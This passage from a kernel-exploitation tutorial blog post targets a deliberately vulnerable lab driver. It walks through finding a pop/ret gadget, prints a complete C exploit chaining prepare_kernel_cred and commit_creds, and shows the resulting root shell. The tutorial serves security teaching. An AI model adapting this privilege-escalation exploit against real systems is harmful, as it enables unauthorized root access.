+#7  __x64_sys_ioctl (regs=&lt;optimized out&gt;) at fs/ioctl.c:770
+#8  0xffffffff81002883 in do_syscall_64 (nr=&lt;optimized out&gt;, regs=0xffffc90000333f58) at arch/x86/entry/common.c:295
+#9  0xffffffff81c0008c in entry_SYSCALL_64 () at arch/x86/entry/entry_64.S:175
+#10 0x0000000000000000 in ?? ()
+</code></pre><p>At #1 and #2, there&rsquo;s garbage for all our purposes, as these are definetly not return addresses. Nevertheless, not everything is lost: the return addresses are intact from #3 onwards. What we have to do is get rid of #1 and #2.</p>
+<p>To do that we need to find a gadget which does a stack POP and a RET and put the gadget address on #1. The POP will get rid of #2 and RET will (hopefully) return the flow to normal. There are several ways to look for gadgets. Given the simplicity of this gadget, we should be able find it in any function we search for. A simple disassemble of prepare_kernel_creds itself will sufice:</p>
+<pre><code>(...)
+   0xffffffff8108e342 &lt;+226&gt;:	pop    %r12
+   0xffffffff8108e344 &lt;+228&gt;:	retq
+</code></pre><p>Perfect! Just what we needed. So we update our payload:
+<code>[BUFFER - 512 bytes] + [PADDING - 16 bytes] + [PREPARE_KERNEL_CRED] + [COMMIT_CREDS] + [0xffffffff8108e342]</code></p>
+<p>Also, we put a <code>system(&quot;/bin/sh&quot;)</code> into the exploit to spawn a shell after privileges are escalated.
+Our final exploit looks like this:</p>
+<pre><code>#include &lt;sys/ioctl.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &quot;../src/vuln_driver.h&quot;
+#include &lt;sys/types.h&gt;
+#include &lt;string.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;unistd.h&gt;
+
+#define BUF_LEN 512
+#define PADDING 16
+#define INTLEN 8
+#define PAYLOAD_LEN BUF_LEN + PADDING + INTLEN + INTLEN + INTLEN
+
+
+#define PREPARE_KERNEL_CRED_ADDR { 0x60, 0xe2, 0x08, 0x81, 0xff, 0xff, 0xff, 0xff }
+#define COMMIT_CREDS_ADDR { 0x20, 0xde, 0x08, 0x81, 0xff, 0xff, 0xff, 0xff }
+#define GADGET { 0x42, 0xe3, 0x08, 0x81, 0xff, 0xff, 0xff, 0xff }
+
+int main()
+{
+    //Opening the vulnerable device
+    char fd = open(&quot;/dev/vulnerable_device&quot;, O_RDWR);
+    //Payload is set do A's
+    char payload[PAYLOAD_LEN+1];
+    char prepare_kernel_cred[] = PREPARE_KERNEL_CRED_ADDR;
+    char commit_creds[] = COMMIT_CREDS_ADDR;
+    char gadget[] = GADGET;
+    memset(payload, 'A', BUF_LEN + PADDING);
+    memcpy(payload + BUF_LEN + PADDING, prepare_kernel_cred, INTLEN);
+    memcpy(payload + BUF_LEN + PADDING + INTLEN, commit_creds, INTLEN);
+    memcpy(payload + BUF_LEN + PADDING + INTLEN + INTLEN, gadget, INTLEN);
+    payload[PAYLOAD_LEN] = '\0';
+    //Sending payload to overflow function
+    ioctl(fd, BUFFER_OVERFLOW, payload);
+    //Releasing the device's FD.
+    close(fd);
+    system(&quot;/bin/sh&quot;);
+}
+</code></pre><p>If everything goes according to plan, it should redirect the exploit&rsquo;s flow to prepare_kernel_cred, then commit the creds generated, do some cleaning up and returning normally to userland.</p>
+<p>And the result is:</p>
+<pre><code>[guest@archlinux exploits]$ id
+uid=1000(guest) gid=1000(guest) groups=1000(guest)
+[guest@archlinux exploits]$ ./exploit
+[75008.865785] [x] Triggering buffer overflow of size 552 [x]
+[75008.866893] VFS: Close: file count is 0
+sh-5.0# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre><h3 id="conclusion">Conclusion<a href="#conclusion" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>We exploited a stack overflow vulnerability with KASLR disabled on Kernel 5.18. We have seen in this post how the kernel stores the task&rsquo;s credentials and one way to change it to escalate privileges. I hope this was a useful example of kernel exploitation for beginners. In future work we will cover how to exploit other vulnerabilities as well as bypassing the KALSR mitigations. Thanks for reading =)</p>
+
+		</div>
+	</main>
+
+	<footer id="site-footer" class="section-inner thin animated fadeIn faster">
+		<p>&copy; 2020 <a href="https://mdanilor.github.io">Danilo &#34;mdanilor&#34; Rodrigues</a> &#183; <a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></p>
+		<p>
+			Made with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> &#183; Theme <a href="https://github.com/Track3/hermit" target="_blank" rel="noopener">Hermit</a> &#183; <a href="https://mdanilor.github.io/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a>
+		</p>
+	</footer>
+
+
+
+	<script src="https://mdanilor.github.io/js/bundle.min.4a9a0ac3d2217822c7865b4161e6c2a71de1d70492264337755427898dd718f6.js" integrity="sha256-SpoKw9IheCLHhltBYebCpx3h1wSSJkM3dVQniY3XGPY=" crossorigin="anonymous"></script>
+	
+
+</body>
+
+</html>
